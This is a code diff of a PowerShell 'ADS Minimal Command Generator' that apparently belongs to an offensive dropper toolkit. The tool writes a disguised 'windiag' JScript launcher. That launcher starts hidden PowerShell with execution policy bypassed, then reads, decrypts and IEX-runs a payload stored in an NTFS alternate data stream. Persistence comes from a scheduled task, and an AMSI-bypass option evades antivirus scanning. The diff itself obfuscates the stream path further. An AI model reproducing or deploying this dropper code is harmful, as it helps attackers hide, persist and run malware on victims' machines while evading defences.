@@ -63,7 +63,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.2.3 (Command Generator - PayloadFile + Expansion Safety)
+    Version: 2.2.4 (Command Generator - JScript Unicode ADS Path Fix)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -106,7 +106,7 @@ param(
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║ ADS Minimal Command Generator v2.2.3                  ║" -ForegroundColor Cyan
+Write-Host "║ ADS Minimal Command Generator v2.2.4                  ║" -ForegroundColor Cyan
 Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
 
 # ============================================================
@@ -576,6 +576,8 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
 
             $block += @"
 `$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
@@ -593,13 +595,14 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
         "[Text.Encoding]::UTF8.GetString(`$p)" +
     "};" +
     "`$k=Get-HostKey;" +
-    "`$e=Get-Content '__ADSPATH__' -Raw;" +
+    "`$_sn=__SNEXPR__;" +
+    "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
 $jsAmsiLine    "`$p=Dec `$e `$k;" +
     "IEX `$p" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
@@ -629,14 +632,16 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 
             $block += @"
 `$adsPath=`$hp+':'+`$sn
+`$_snEsc=(`$sn.ToCharArray()|%{'[char]0x{0:X4}'-f[int]`$_}) -join '+'
+`$_hpEsc=`$hp-replace'\\','\\\\'
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-$jsAmsiLineUnenc    "IEX(Get-Content '__ADSPATH__' -Raw)" +
+$jsAmsiLineUnenc    "`$_sn=__SNEXPR__;IEX(Get-Content ('__HOSTPATH__:'+`$_sn) -Raw)" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
@@ -767,7 +772,7 @@ if (-not $PayloadAtDeployment) {
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
         AmsiBypass        = (-not $NoAmsi)
-        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.3" } else { "Disabled" }
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.4" } else { "Disabled" }
         PayloadHash       = $payloadHash
         PayloadSource     = if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" }
         Operator          = $env:USER
